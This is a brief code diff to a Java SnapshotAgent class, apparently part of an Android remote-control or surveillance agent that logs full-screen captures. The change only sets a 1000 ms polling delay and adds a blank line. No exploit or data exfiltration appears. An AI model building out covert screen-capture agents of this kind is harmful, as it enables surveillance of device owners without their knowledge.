@@ -54,6 +54,7 @@ public class SnapshotAgent extends AgentBase {
 	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
 	 */
 	public void begin() {
+		setDelay(1000);
 		setPeriod(this.delay);
 	}
 
@@ -65,6 +66,7 @@ public class SnapshotAgent extends AgentBase {
 
 		switch (type) {
 		case CAPTURE_FULLSCREEN:
+			
 			Log.d("RCS", "Snapshot Agent: logging full screen");
 			break;
 
